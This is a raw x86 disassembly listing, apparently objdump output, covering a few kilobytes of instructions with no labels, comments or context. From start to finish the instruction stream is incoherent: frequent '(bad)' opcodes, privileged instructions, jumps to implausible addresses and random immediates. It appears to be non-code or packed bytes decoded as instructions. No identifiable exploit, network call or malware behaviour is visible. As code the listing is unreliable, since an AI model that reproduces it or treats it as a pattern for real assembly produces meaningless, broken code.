  431a81:	add    BYTE PTR [ebx],al
  431a83:	inc    ebp
  431a84:	(bad)  
  431a85:	mov    ecx,DWORD PTR [edx]
  431a87:	fadd   st(6),st
  431a89:	ret    
  431a8a:	add    ah,BYTE PTR [edi-0x37]
  431a8d:	int    0x55
  431a8f:	sub    ebp,esp
  431a91:	add    edx,DWORD PTR [ecx-0x14]
  431a94:	inc    ebp
  431a95:	inc    ebp
  431a96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431a9c:	cld    
  431a9d:	(bad)  
  431a9e:	mov    WORD PTR [edi+0xf893be0],gs
  431aa4:	mov    ebp,ebp
  431aa6:	clc    
  431aa7:	push   eax
  431aa9:	push   DWORD PTR [ebp-0x4]
  431aac:	mov    BYTE PTR [ebp+0xa],0xff
  431ab0:	(bad)  
  431ab1:	int3   
  431ab2:	or     BYTE PTR [eax],al
  431ab4:	(bad)  
  431ab5:	lea    eax,[edi]
  431ab7:	ins    BYTE PTR es:[edi],dx
  431ab8:	(bad)  
  431ab9:	inc    DWORD PTR [ecx]
  431abb:	push   eax
  431abc:	mov    BYTE PTR [ebp+0x9],0x8b
  431ac0:	leave  
  431ac1:	les    edx,FWORD PTR [ebp+0x0]
  431ac4:	in     al,dx
  431ac5:	call   DWORD PTR [ecx-0x75]
  431ac8:	inc    ebp
  431ac9:	cld    
  431aca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431ad0:	cld    
  431ad1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431ad7:	std    
  431ad8:	mov    eax,DWORD PTR [eax]
  431ada:	clc    
  431adb:	test   eax,esi
  431add:	je     0x431b54
  431adf:	mov    eax,esi
  431ae1:	cld    
  431ae2:	add    al,0x80
  431ae4:	add    WORD PTR [ecx+0x0],ax
  431ae8:	fiadd  DWORD PTR [eax]
  431aea:	mov    BYTE PTR [eax],0xd6
  431aed:	push   0xffffffc3
  431aef:	push   edi
  431af0:	mov    edx,DWORD PTR [eax+0x51]
  431af3:	pop    edi
  431af4:	lea    ebx,[ebx-0x8]
  431af7:	ret    0x45
  431afa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431b00:	xchg   eax,edi
  431b02:	mov    DWORD PTR [ebp-0x75],ecx
  431b05:	push   esi
  431b06:	clc    
  431b07:	jne    0x431ad9
  431b09:	mov    ecx,0xf8450b0b
  431b0e:	(bad)  
  431b0f:	push   cs
  431b10:	or     BYTE PTR [ebp-0x3a],dh
  431b13:	cmp    eax,DWORD PTR [ecx]
  431b15:	pop    esi
  431b16:	(bad)  
  431b17:	or     al,0x5
  431b19:	inc    eax
  431b1a:	leave  
  431b1b:	jmp    0x40cf:0x21564204
  431b22:	leave  
  431b23:	jmp    0xdace5c27
  431b28:	mov    eax,DWORD PTR [edx-0x3a]
  431b2b:	jle    0x431b23
  431b2d:	inc    eax
  431b2e:	nop
  431b2f:	in     al,dx
  431b30:	inc    ebx
  431b32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431b38:	add    eax,0xff45e8f8
  431b3d:	push   esi
  431b3e:	push   DWORD PTR [ebp-0x39]
  431b41:	mov    eax,0x7e9da46
  431b46:	or     al,0x6
  431b48:	push   DWORD PTR [ebp-0x3a]
  431b4b:	cmp    eax,DWORD PTR [edx]
  431b4d:	pop    esi
  431b4e:	ret    
  431b4f:	or     al,0x56
  431b51:	inc    ecx
  431b52:	push   ebp
  431b53:	jle    0x431b41
  431b55:	inc    edx
  431b56:	inc    ebp
  431b57:	leave  
  431b58:	add    DWORD PTR [ecx+0x28],eax
  431b5b:	and    esp,edi
  431b5d:	inc    ecx
  431b5e:	jne    0x431b47
  431b60:	add    DWORD PTR [edx+0x1c],eax
  431b63:	retf   0xc38b
  431b66:	adc    al,0x8b
  431b68:	xchg   edx,eax
  431b69:	push   ecx
  431b6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431b70:	rcl    DWORD PTR [esi-0x9],cl
  431b73:	jne    0x431bc5
  431b75:	mov    eax,0x7c80ece
  431b7a:	rol    DWORD PTR [esi],cl
  431b7c:	div    DWORD PTR [ebp+0x50]
  431b7f:	cmp    ecx,edx
  431b81:	pop    esi
  431b82:	dec    BYTE PTR [edx]
  431b84:	in     al,dx
  431b85:	inc    edx
  431b86:	sub    ebp,ebp
  431b88:	inc    eax
  431b89:	(bad)  
  431b8a:	push   eax
  431b8b:	add    edx,DWORD PTR [eax-0x13]
  431b8e:	push   edi
  431b8f:	add    dh,dh
  431b91:	leave  
  431b92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431b96:	add    BYTE PTR [ecx+0x0],dl
  431b99:	inc    ebp
  431b9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ba0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ba6:	add    al,0x2
  431ba8:	jmp    0x57ec702
  431bad:	jne    0x431b97
  431baf:	mov    eax,DWORD PTR [edx]
  431bb1:	or     BYTE PTR [eax],al
  431bb3:	inc    ecx
  431bb4:	stc    
  431bb5:	jmp    0xe7825bf0
  431bba:	jge    0x431bfd
  431bbc:	mov    esi,ebp
  431bbe:	lock ret 0x7d
  431bc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431bc8:	add    bh,bh
  431bca:	aad    0xd7
  431bcc:	add    dh,cl
  431bce:	clts   
  431bd0:	(bad)  
  431bd1:	call   0xffce1ad6
  431bd6:	hlt    
  431bd7:	iret   
  431bd8:	jge    0x431bb0
  431bda:	rol    DWORD PTR [esi-0x80],cl
  431bdd:	cmc    
  431bde:	or     BYTE PTR [edi-0x27],cl
  431be1:	(bad)  
  431be2:	out    dx,al
  431be3:	mov    eax,DWORD PTR [ebx]
  431be5:	(bad)  
  431be6:	pop    esi
  431be7:	push   es
  431be8:	cmp    al,0xe8
  431bea:	sar    edi,0x8
  431bed:	inc    DWORD PTR [edi]
  431bef:	inc    esi
  431bf0:	(bad)  
  431bf1:	in     al,dx
  431bf2:	jle    0x431c4b
  431bf4:	push   cs
  431bf5:	push   ebx
  431bf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431bfc:	add    BYTE PTR [ebp+0x50],al
  431bff:	push   eax
  431c00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431c06:	sub    edx,DWORD PTR [esi-0x24]
  431c09:	jne    0x431bc1
  431c0b:	lods   eax,DWORD PTR ds:[esi]
  431c0c:	mov    edx,DWORD PTR [edx-0x34]
  431c0f:	dec    esi
  431c10:	out    0x83,eax
  431c12:	into   
  431c13:	push   edi
  431c15:	loopne 0x431be5
  431c17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431c1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431c22:	rol    DWORD PTR [edx],0x8
  431c25:	mov    esp,ecx
  431c27:	cmp    DWORD PTR [ebx],0xc
  431c2a:	mov    esi,0x5001c0
  431c2f:	push   eax
  431c30:	push   cs
  431c31:	push   eax
  431c32:	(bad)  
  431c33:	sub    edx,edi
  431c35:	push   esi
  431c36:	adc    al,0xcb
  431c38:	ins    DWORD PTR es:[edi],dx
  431c39:	mov    eax,0x203e8
  431c3e:	add    al,ah
  431c40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431c47:	add    dh,al
  431c49:	add    ah,ch
  431c4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431c51:	pop    ecx
  431c52:	or     eax,ebx
  431c54:	cli    
  431c55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431c5b:	lea    ebp,[ebx]
  431c5d:	mov    edx,DWORD PTR [edx-0x4]
  431c60:	dec    ecx
  431c61:	inc    ebp
  431c62:	shr    BYTE PTR [ebx],0x4b
  431c65:	and    al,0x0
  431c67:	(bad)  
  431c68:	jne    0x431caf
  431c6a:	pop    eax
  431c6b:	mov    al,0x5a
  431c6d:	call   0x1421ecc
  431c72:	and    al,0x85
  431c74:	push   edx
  431c75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431c79:	dec    ebp
  431c7a:	mov    cl,0x23
  431c7c:	jmp    0x431c6a
  431c7e:	mov    al,0xe7
  431c80:	call   0x1391f6e
  431c85:	shr    DWORD PTR [eax+ebx*2],cl
  431c88:	lock (bad) 
  431c8a:	adc    eax,0x757f008d
  431c8f:	out    0x58,eax
  431c91:	cmp    al,0x7
  431c93:	pop    edx
  431c94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431c9b:	push   ecx
  431c9c:	cld    
  431c9d:	mov    esi,0x3b0175
  431ca2:	and    al,0xb0
  431ca4:	xor    BYTE PTR [edx+0x1],0x8b
  431ca8:	add    ah,bh
  431caa:	mov    edi,DWORD PTR [ebp-0x4]
  431cad:	psubsw mm7,QWORD PTR [edi]
  431cb0:	add    DWORD PTR [ebp+0x0],ebp
  431cb3:	rcr    eax,1
  431cb5:	mov    edi,ecx
  431cb7:	and    eax,DWORD PTR [eax]
  431cb9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431cbf:	call   0x1301fa8
  431cc4:	add    al,cl
  431cc6:	mov    ebp,esi
  431cc8:	aam    0x83
  431cca:	or     DWORD PTR [ecx],eax
  431ccc:	jne    0x431cbf
  431cce:	mov    eax,DWORD PTR [eax]
  431cd0:	aam    0x0
  431cd2:	dec    ebp
  431cd3:	jne    0x431c60
  431cd5:	cmp    ebx,eax
  431cd7:	jb     0x431d26
  431cd9:	jmp    0x431c66
  431cdb:	mov    ebx,esp
  431cdd:	int3   
  431cde:	dec    ebp
  431cdf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431ce6:	mov    edx,0x8b0a8b
  431ceb:	cmp    ecx,DWORD PTR [eax]
  431ced:	jb     0x431cc6
  431cef:	pop    edx
  431cf0:	push   edi
  431cf1:	cli    
  431cf2:	pop    es
  431cf3:	mov    eax,ecx
  431cf5:	jb     0x431cf9
  431cf7:	add    DWORD PTR [ebx],0xa
  431cfa:	mov    eax,DWORD PTR [ebx]
  431cfc:	int3   
  431cfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431d03:	jmp    0x431c90
  431d05:	mov    al,0xe8
  431d07:	call   0x1041f89
  431d0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431d0f:	pop    edi
  431d10:	or     BYTE PTR [ecx-0x73],bl
  431d13:	pop    ecx
  431d14:	inc    edi
  431d15:	xor    al,0xeb
  431d17:	push   ecx
  431d18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431d1e:	call   0xb21e23
  431d23:	int3   
  431d24:	sbb    BYTE PTR [esi],ch
  431d26:	inc    ebp
  431d27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431d2d:	call   0x9c1f9c
  431d32:	or     BYTE PTR [ebx-0x73],dl
  431d35:	cmp    al,0x47
  431d37:	mov    al,0x1
  431d39:	jb     0x431d3b
  431d3b:	mov    al,0x10
  431d3d:	push   eax
  431d3e:	add    al,0x75
  431d40:	add    BYTE PTR [ebx],ch
  431d42:	add    ebx,esp
  431d44:	int3   
  431d45:	jne    0x431d57
  431d47:	movsx  edx,cl
  431d4a:	add    DWORD PTR [eax],eax
  431d4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431d53:	mov    gs,edi
  431d55:	add    BYTE PTR [eax-0x50],ch
  431d58:	add    al,ch
  431d5a:	mov    eax,DWORD PTR [ecx]
  431d5c:	sub    eax,DWORD PTR [eax]
  431d5e:	jb     0x431dd5
  431d60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431d64:	jge    0x431d4e
  431d66:	add    al,0x1
  431d68:	add    DWORD PTR [eax],0x0
  431d6b:	jne    0x431d6d
  431d6d:	je     0x431db4
  431d6f:	mov    eax,DWORD PTR [edi]
  431d71:	ror    BYTE PTR [ebp+0x4d],1
  431d74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431d7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431d81:	mov    DWORD PTR [ebx],ebp
  431d83:	fadd   DWORD PTR [eax+0x75]
  431d86:	inc    eax
  431d87:	pop    eax
  431d88:	lea    ebx,[ecx+0x4f]
  431d8b:	push   0xb1000003
  431d90:	out    dx,eax
  431d91:	add    ebp,DWORD PTR [edx+edx*2]
  431d94:	add    BYTE PTR [ebx+ecx*4],bh
  431d97:	mov    ch,BYTE PTR [ebx]
  431d99:	jb     0x431e0d
  431d9b:	add    al,0x89
  431d9d:	push   eax
  431d9e:	call   0x842b6b10
  431da3:	add    DWORD PTR [eax+eax*1],eax
  431da6:	jae    0x431dbc
  431da8:	icebp  
  431da9:	inc    ebp
  431daa:	mov    eax,DWORD PTR gs:[ecx]
  431dad:	int3   
  431dae:	out    dx,al
  431daf:	loopne 0x431dfe
  431db1:	sub    eax,DWORD PTR [edx]
  431db3:	push   0xffffff83
  431db5:	pop    esi
  431db6:	push   cs
  431db7:	jl     0x431dd2
  431db9:	add    al,0xaf
  431dbb:	xor    eax,0x832b6d00
  431dc0:	mov    eax,DWORD PTR [edx]
  431dc2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431dc8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431dce:	inc    ebp
  431dcf:	shr    ebx,0x3
  431dd2:	or     DWORD PTR [eax],0x4
  431dd5:	push   0xffffffa5
  431dd7:	pop    esi
  431dd8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431ddf:	jmp    0x431e3e
  431de1:	mov    edi,0xff0272
  431de6:	fdivr  QWORD PTR [ebp+0x5d]
  431de9:	push   0x4e
  431deb:	pop    ecx
  431dec:	call   0x4361f1
  431df1:	mov    DWORD PTR [ebx],eax
  431df3:	in     al,0xc8
  431df5:	rol    BYTE PTR [ebp-0x75],0xc1
  431df9:	call   0xad1fda
  431dfe:	pop    esi
  431dff:	enter  0xceff,0x8b
  431e03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431e07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431e0e:	je     0x431e10
  431e10:	or     DWORD PTR [ebx-0x74183b24],eax
  431e16:	jne    0x431dfc
  431e18:	jmp    0x431e13
  431e1a:	push   DWORD PTR [edx-0x24]
  431e1d:	push   0x4d
  431e1f:	pop    ecx
  431e20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431e24:	jge    0x431e2c
  431e26:	mov    eax,eax
  431e28:	sub    ebp,DWORD PTR [edx+0x24]
  431e2b:	pop    esi
  431e2c:	inc    ebp
  431e2d:	mov    esp,0x8b6077
  431e32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431e38:	lods   al,BYTE PTR ds:[esi]
  431e39:	add    BYTE PTR [ebx],bh
  431e3b:	enter  0xce73,0x49
  431e3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431e47:	stc    
  431e48:	jge    0x431ebc
  431e4a:	jnp    0xdd42a1b9
  431e50:	call   0xc61f26
  431e55:	fadd   st(0),st
  431e57:	dec    esi
  431e58:	ins    BYTE PTR es:[edi],dx
  431e59:	stc    
  431e5a:	cmp    al,0x73
  431e5c:	push   ebp
  431e5d:	mov    eax,0xf8028b
  431e62:	jne    0x431e25
  431e64:	mov    esi,ecx
  431e66:	mov    esp,DWORD PTR [ebp+0x2c]
  431e69:	add    edi,DWORD PTR [ebp-0x24]
  431e6c:	sub    esp,eax
  431e6e:	and    al,0x45
  431e70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431e76:	sbb    al,0xee
  431e78:	pop    esi
  431e79:	call   0x831ea9
  431e7e:	fsubr  st,st(3)
  431e80:	sti    
  431e81:	add    BYTE PTR gs:[ecx],bh
  431e84:	add    eax,esp
  431e86:	add    DWORD PTR [esi],eax
  431e88:	rol    DWORD PTR [ebp+0x8],0x29
  431e8c:	mov    esp,eax
  431e8e:	clc    
  431e8f:	jne    0x431f06
  431e91:	mov    eax,0x8b0673
  431e96:	loopne 0x431edd
  431e98:	loopne 0x431e23
  431e9a:	lods   al,BYTE PTR ds:[esi]
  431e9b:	int3   
  431e9c:	inc    ebp
  431e9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431ea1:	add    al,0xc3
  431ea3:	sub    ecx,DWORD PTR [ebp+0x47]
  431ea6:	(bad)  
  431ea8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431eac:	add    eax,DWORD PTR [eax]
  431eae:	call   0x644dfb3
  431eb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431eb9:	dec    esi
  431eba:	ins    DWORD PTR es:[edi],dx
  431ebb:	in     al,dx
  431ebc:	lea    eax,[eax]
  431ebe:	inc    ebp
  431ebf:	inc    ebp
  431ec0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431ec6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431ed0:	and    al,0xdc
  431ed2:	ror    DWORD PTR [edx+0x24],0xf7
  431ed6:	or     BYTE PTR [ebp+0x4c],dh
  431ed9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431edd:	stos   BYTE PTR es:[edi],al
  431ede:	adc    edx,edi
  431ee0:	inc    esp
  431ee1:	add    edi,DWORD PTR [eax]
  431ee3:	jne    0x431ec8
  431ee5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431eeb:	cmp    ecx,DWORD PTR [edi]
  431eed:	sub    BYTE PTR [ebp-0x7e],dl
  431ef0:	sar    ebp,0xb
  431ef3:	jmp    FWORD PTR [edi+0x2400392a]
  431ef9:	sub    esi,DWORD PTR [ebx-0x73]
  431efc:	mov    esp,DWORD PTR [ecx+edi*4]
  431eff:	mov    ecx,DWORD PTR [eax]
  431f01:	and    BYTE PTR [eax],al
  431f03:	jne    0x431ecf
  431f05:	sub    ebp,ecx
  431f07:	sbb    BYTE PTR [esi+0x32],ah
  431f0a:	dec    ebp
  431f0b:	push   ebp
  431f0c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431f12:	ret    
  431f13:	mov    edx,ebp
  431f15:	leave  
  431f16:	sub    DWORD PTR [esi+0x24],ebx
  431f19:	ret    0x2b
  431f1c:	pop    ax
  431f1e:	push   ebp
  431f1f:	rol    BYTE PTR [ebx],0xeb
  431f22:	add    DWORD PTR [ecx+0x6c0001],0x40
  431f29:	jb     0x431f80
  431f2b:	ret    
  431f2c:	in     al,dx
  431f2d:	jecxz  0x431eba
  431f2f:	push   esi
  431f30:	xchg   esp,eax
  431f31:	jne    0x431f33
  431f33:	cmp    edx,DWORD PTR [esi+0x1c]
  431f36:	jne    0x431f1c
  431f38:	mov    eax,DWORD PTR [ebp-0x77]
  431f3b:	ror    DWORD PTR [ebx+0x899408],0xe0
  431f42:	mov    esi,DWORD PTR [ebp-0x75]
  431f45:	pop    esi
  431f46:	nop
  431f47:	mov    eax,DWORD PTR [eax]
  431f49:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431f4f:	add    al,0x0
  431f51:	inc    ebp
  431f52:	mov    eax,DWORD PTR [ebx]
  431f54:	mov    ebp,ebx
  431f56:	cmp    al,0xf
  431f58:	or     al,al
  431f5a:	inc    ebp
  431f5b:	inc    ebp
  431f5c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431f64:	mov    bh,0xc0
  431f66:	push   ss
  431f67:	ins    BYTE PTR es:[edi],dx
  431f68:	push   ecx
  431f69:	add    BYTE PTR [ecx-0x5],dl
  431f6c:	add    eax,0x17200
  431f71:	sbb    al,0x85
  431f73:	dec    esp
  431f74:	je     0x431fae
  431f76:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431f7a:	add    BYTE PTR [ebx],bh
  431f7c:	(bad)  
  431f7d:	and    al,0x39
  431f7f:	jae    0x431f1d
  431f81:	mov    cl,cl
  431f83:	inc    DWORD PTR [esp]
  431f86:	push   ebp
  431f87:	shr    esp,0x8
  431f8a:	in     al,dx
  431f8b:	push   esp
  431f8c:	add    DWORD PTR [eax],esp
  431f8e:	add    bl,cl
  431f90:	inc    ebp
  431f91:	mov    bh,0x89
  431f93:	add    ah,bh
  431f95:	jmp    0xca7c2edf
  431f9a:	pushf  
  431f9b:	dec    esp
  431f9c:	mov    edx,0xf8178520
  431fa1:	fst    DWORD PTR [ebp+0x0]
  431fa4:	mov    BYTE PTR [eax],0xc4
  431fa7:	sub    edx,DWORD PTR [ebx-0x3f]
  431faa:	inc    ebp
  431fab:	add    eax,0xc601da
  431fb0:	mov    al,0xc6
  431fb3:	ins    BYTE PTR es:[edi],dx
  431fb4:	mov    DWORD PTR [eax+0x57],0x280545c1
  431fbb:	dec    esp
  431fbc:	jmp    DWORD PTR [eax]
  431fbe:	inc    ebp
  431fbf:	fnstcw WORD PTR [esi+0x29]
  431fc2:	test   BYTE PTR [eax],0xc6
  431fc5:	rol    BYTE PTR [eax],0xc0
  431fc8:	lea    ecx,[ebp-0x3cf0dbcb]
  431fce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431fd4:	inc    esi
  431fd5:	add    DWORD PTR [eax],ebx
  431fd7:	add    dh,bh
  431fd9:	mov    esi,DWORD PTR [edx+0x8]
  431fdc:	(bad)  
  431fdd:	fdiv   QWORD PTR ss:[ecx]
  431fe0:	(bad)  
  431fe1:	mov    bl,ch
  431fe3:	add    esi,eax
  431fe5:	add    dh,bl
  431fe7:	or     esi,eax
  431fe9:	mov    dl,0xdf
  431feb:	add    esi,eax
  431fed:	add    al,ah
  431fef:	push   cs
  431ff0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431ff7:	or     BYTE PTR [ebx],dh
  431ff9:	dec    ecx
  431ffa:	lea    eax,[ebx]
  431ffc:	xor    eax,0x18fc0fc7
  432001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432002:	repz clc 
  432004:	add    eax,DWORD PTR [ebp+0x46]
  432007:	prefetcht0 BYTE PTR [ecx-0x2]
  43200b:	xor    eax,0x7c60872
  432010:	mov    esp,0xbd32c699
  432015:	pop    esi
  432016:	mov    cl,0xbe
  432019:	or     al,0xc6
  43201b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432022:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432029:	add    dh,al
  43202b:	mov    eax,ebx
  43202d:	xor    DWORD PTR [ebx],0x35008dbc
  432033:	mov    ecx,DWORD PTR [edi]
  432035:	sbb    al,0x18
  432037:	inc    ebp
  432038:	xrelease mov DWORD PTR [ebx],0x188546f4
  43203f:	clc    
  432040:	(bad)  
  432041:	ss jb  0x431fe0
  432044:	lea    ecx,[ecx+0x45ffe838]
  43204a:	mov    ebp,esp
  43204c:	fadd   st,st(6)
  43204e:	dec    ebp
  43204f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432055:	out    0x1,eax
  432057:	inc    ebp
  432058:	lea    ebp,[ecx]
  43205a:	inc    esi
  43205c:	dec    eax
  43205e:	enter  0xa33,0xc6
  432062:	push   ebp
  432063:	leave  
  432064:	(bad)  
  432065:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43206b:	add    BYTE PTR [ebp+0x44],al
  43206e:	mov    eax,esp
  432070:	mov    WORD PTR [esi+0x44398300],?
  432076:	psubusw mm4,QWORD PTR [eax-0x78]
  43207a:	add    BYTE PTR [ebx-0x1303f975],al
  432080:	add    BYTE PTR [ebp+0x1],0xeb
  432084:	add    BYTE PTR [ebp+0x38],al
  432087:	jmp    0xdbce65d1
  43208c:	add    BYTE PTR [ebp+0x0],0xe8
  432090:	mov    DWORD PTR [ebp-0x48],eax
  432093:	sub    DWORD PTR [edi+0x45],ecx
  432096:	add    BYTE PTR [eax],ch
  432098:	js     0x4320df
  43209a:	data16 jle 0x432022
  43209d:	idiv   bh
  43209f:	inc    esp
  4320a0:	(bad)  
  4320a1:	fadd   st(7),st
  4320a3:	mov    dh,0x89
  4320a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4320a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4320af:	pop    es
  4320b0:	push   0x8d45ffec
  4320b5:	jmp    0xe6cc65bd
  4320ba:	push   0x45
  4320bc:	jmp    edx
  4320be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4320c2:	mov    DWORD PTR [ebp+0x6c],eax
  4320c5:	(bad)  
  4320c7:	inc    ebp
  4320c8:	(bad)  
  4320c9:	out    dx,al
  4320ca:	add    al,0x45
  4320cc:	mov    edi,esp
  4320ce:	outs   dx,BYTE PTR ds:[esi]
  4320cf:	inc    ebp
  4320d0:	(bad)  
  4320d1:	jle    0x432056
  4320d3:	idiv   BYTE PTR ds:0x70bc8944
  4320d9:	mov    dh,0xff
  4320db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4320e2:	jb     0x432067
  4320e4:	dec    DWORD PTR [eax]
  4320e6:	mov    ebp,esp
  4320e8:	test   WORD PTR [ebp-0x1],ax
  4320ef:	inc    ebp
  4320f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4320f7:	adc    edi,edi
  4320f9:	mov    ebp,edi
  4320fb:	mov    eax,DWORD PTR [eax]
  4320fd:	cmp    BYTE PTR [esi-0x1],ah
  432100:	test   DWORD PTR [ebx],edi
  432102:	push   DWORD PTR [ebp-0x1]
  432105:	mov    DWORD PTR [esi-0x48],ebp
  432108:	add    BYTE PTR [ebp+0x66],al
  43210b:	jmp    0x432092
  43210d:	pushf  
  43210e:	dec    DWORD PTR [ebx-0x7f940301]
  432114:	add    BYTE PTR [ecx],al
  432116:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43211d:	add    al,al
  43211f:	add    BYTE PTR [esi+0x45],ah
  432122:	test   DWORD PTR [ebx+0xff7cff],ecx
  432128:	inc    eax
  432129:	mov    DWORD PTR [eax],eax
  43212b:	mov    esp,DWORD PTR [esi-0x4]
  43212e:	inc    ebp
  43212f:	cmp    BYTE PTR [eax+0x4701],0x38
  432136:	mov    DWORD PTR [ebp-0x7e],ebp
  432139:	add    BYTE PTR [edi-0x73],al
  43213c:	push   0xffffffcd
  43213e:	mov    WORD PTR [ebp+0x64],ax
  432142:	(bad)  
  432143:	call   eax
  432145:	mov    esp,esi
  432147:	data16 cmc 
  432149:	test   DWORD PTR [ebp-0x1],eax
  43214c:	(bad)  
  43214e:	out    0xc0,eax
  432150:	lea    esp,[esi-0x30]
  432153:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432159:	inc    edi
  43215a:	jmp    0x75ff:0x40858866
  432161:	dec    DWORD PTR [ebp-0x7a992f40]
  432167:	test   esi,edi
  432169:	(bad)  
  43216a:	(bad)  
  43216b:	inc    DWORD PTR [ebp-0x9901b9]
  432171:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432177:	rcl    BYTE PTR [ecx+0x66],0x33
  43217b:	test   DWORD PTR [ebx+0xff72ff],edi
  432181:	inc    edi
  432182:	ret    
  432183:	mov    ax,WORD PTR [ebp-0x3f0004]
  43218a:	push   eax
  43218b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432192:	add    BYTE PTR [ebx-0x764f0839],al
  432198:	push   DWORD PTR [esi+0x1]
  43219b:	inc    DWORD PTR [eax]
  43219d:	mov    eax,0xff99ff
  4321a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4321a8:	jne    0x432162
  4321aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4321b4:	mov    ecx,0xd74fb8
  4321b9:	add    cl,al
  4321bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4321c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4321c8:	(bad)  
  4321c9:	(bad)  
  4321ca:	std    
  4321cb:	mov    eax,0x8c2789
  4321d0:	ret    0x6689
  4321d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4321d7:	add    bh,ah
  4321d9:	mov    WORD PTR [ebp-0x70],ax
  4321dd:	(bad)  
  4321de:	ret    0x6605
  4321e1:	or     BYTE PTR [ebp-0x77],dl
  4321e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4321eb:	loop   0x432176
  4321ed:	(bad)  
  4321ee:	xchg   esi,eax
  4321ef:	aam    0xcf
  4321f1:	out    dx,al
  4321f2:	mov    DWORD PTR [esi-0x68],edi
  4321f5:	inc    ebp
  4321f6:	dec    edx
  4321f7:	pop    ecx
  4321f8:	mov    edx,DWORD PTR [eax]
  4321fa:	repnz push bp
  4321fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432204:	(bad)  
  432205:	repnz cmp eax,0xa0898945
  43220b:	mov    ah,0x89
  43220d:	jmp    DWORD PTR [edx+0x66b0418d]
  432213:	inc    DWORD PTR [ebp+0x50]
  432216:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43221a:	mov    DWORD PTR [eax],ecx
  43221c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43221d:	pop    es
  43221e:	inc    ecx
  43221f:	(bad)  
  432220:	cwd    
  432222:	inc    ebp
  432223:	xor    ah,BYTE PTR [esi+0x3]
  432226:	dec    ebp
  432227:	push   eax
  432228:	inc    bp
  43222a:	jge    0x4321af
  43222c:	mov    esp,DWORD PTR [esi-0x18]
  43222f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432235:	add    DWORD PTR [ebx],esi
  432237:	add    BYTE PTR [ebx],al
  432239:	test   DWORD PTR [ebx],esi
  43223b:	(bad)  
  43223c:	inc    WORD PTR [ebp+0x0]
  432240:	mov    eax,DWORD PTR [eax]
  432242:	call   0x8898d977
  432247:	mov    esi,eax
  432249:	clc    
  43224a:	ret    
  43224b:	rol    cl,0xa
  43224e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432254:	mov    edx,edi
  432256:	pushf  
  432257:	pop    es
  432258:	jmp    DWORD PTR [edx+0x66]
  43225b:	add    BYTE PTR [ebp-0x990175],al
  432261:	inc    ebp
